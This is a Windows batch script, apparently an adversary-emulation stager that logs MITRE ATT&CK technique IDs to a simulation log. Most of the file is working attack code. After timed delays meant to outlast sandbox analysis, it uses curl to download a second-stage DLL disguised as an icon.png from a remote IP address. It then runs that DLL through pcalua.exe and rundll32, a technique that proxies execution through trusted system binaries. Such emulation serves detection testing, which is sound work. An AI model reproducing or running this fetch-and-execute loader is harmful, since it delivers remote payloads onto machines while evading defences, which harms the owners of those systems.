@echo off
setlocal enabledelayedexpansion

REM --- Random-named SET variable declarations for all PHR_* placeholders ---
SET qb3m7x=%APPDATA%\10790\8846de03
SET lk9yw2=33bff7bd.txt
SET rpv4s8=https://10.0.0.49/stage/2/icon.png?10790-7
SET f2g1h5=BALAM-S2BO
SET j6t8u9=10790
SET z0n3p1=7
SET y4w7k2=%PUBLIC%\\macula-simulations.log

REM --- Capture timestamp once for all debug lines ---
SET tsvar=!DATE!/!TIME!

REM --- Initial delay (10-20s) before any logic ---
timeout /t 15 /nobreak >nul

REM --- Debug: heartbeat_start ---
echo [!tsvar!][DEBUG][!f2g1h5!][!j6t8u9!]: heartbeat_start>> "!y4w7k2!" 2>nul

REM --- Step 1: Heartbeat fetch - download Stage 2 Loader DLL via curl ---
curl -k -s -o "!qb3m7x!\!lk9yw2!" "!rpv4s8!"

REM --- Debug: heartbeat_complete ---
echo [!tsvar!][DEBUG][!f2g1h5!][!j6t8u9!]: heartbeat_complete>> "!y4w7k2!" 2>nul

REM --- Delay after download (5-15s, use ping) ---
ping -n 8 127.0.0.1 >nul

REM --- Debug: chdir_start ---
echo [!tsvar!][DEBUG][!f2g1h5!][!j6t8u9!]: chdir_start>> "!y4w7k2!" 2>nul

REM --- Step 2: Change working directory to output directory ---
cd /d "!qb3m7x!" >nul 2>&1

REM --- Debug: chdir_result ---
if "%errorlevel%"=="0" (
    echo [!tsvar!][DEBUG][!f2g1h5!][!j6t8u9!]: chdir_result=0>> "!y4w7k2!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!f2g1h5!][!j6t8u9!]: chdir_result=1>> "!y4w7k2!" 2>nul
)

REM --- Delay before LOLBIN execution (use CHOICE) ---
CHOICE /C Y /N /D Y /T 8 >nul

REM --- Debug: rundll32_start ---
echo [!tsvar!][DEBUG][!f2g1h5!][!j6t8u9!]: rundll32_start>> "!y4w7k2!" 2>nul

REM --- Step 3: Invoke the downloaded DLL via pcalua -> rundll32 ---
pcalua.exe -a C:\Windows\System32\rundll32.exe -c "!qb3m7x!\!lk9yw2!,RunSimulation"

REM --- Debug: rundll32_result ---
if "%errorlevel%"=="0" (
    echo [!tsvar!][DEBUG][!f2g1h5!][!j6t8u9!]: rundll32_result=0>> "!y4w7k2!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!f2g1h5!][!j6t8u9!]: rundll32_result=1>> "!y4w7k2!" 2>nul
)

REM --- Random delay (10-30s) to evade sandbox ---
SET /A rndelay=%RANDOM% %% 20 + 10
timeout /t !rndelay! /nobreak >nul

REM --- Log TTP: T1497 - Virtualization/Sandbox Evasion ---
echo [!tsvar!][TTP][!f2g1h5!][!j6t8u9!]: T1497|Virtualization/Sandbox Evasion=OK:>> "!y4w7k2!" 2>nul

REM --- Log TTP: T1218 - System Binary Proxy Execution ---
echo [!tsvar!][TTP][!f2g1h5!][!j6t8u9!]: T1218|System Binary Proxy Execution=OK:>> "!y4w7k2!" 2>nul

REM --- Final small delay before exit ---
ping -n 3 127.0.0.1 >nul

exit /b 0